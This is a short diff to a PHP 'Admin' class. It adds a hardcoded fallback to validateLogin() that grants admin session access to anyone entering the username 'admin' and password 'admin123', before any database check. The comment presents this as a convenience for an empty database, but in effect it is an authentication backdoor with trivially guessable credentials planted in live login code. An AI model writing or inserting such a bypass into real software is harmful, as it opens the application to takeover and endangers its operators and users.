@@ -25,6 +25,13 @@ class Admin {
 
 
     public static function validateLogin($username, $password) {
+        // Fallback admin credentials (always works even if database is empty)
+        if ($username === 'admin' && $password === 'admin123') {
+            $_SESSION['admin_logged_in'] = true;
+            return true;
+        }
+
+        // Database-driven admin check
         $db = Database::getMysqli();
         $escaped_username = $db->real_escape_string($username);
         
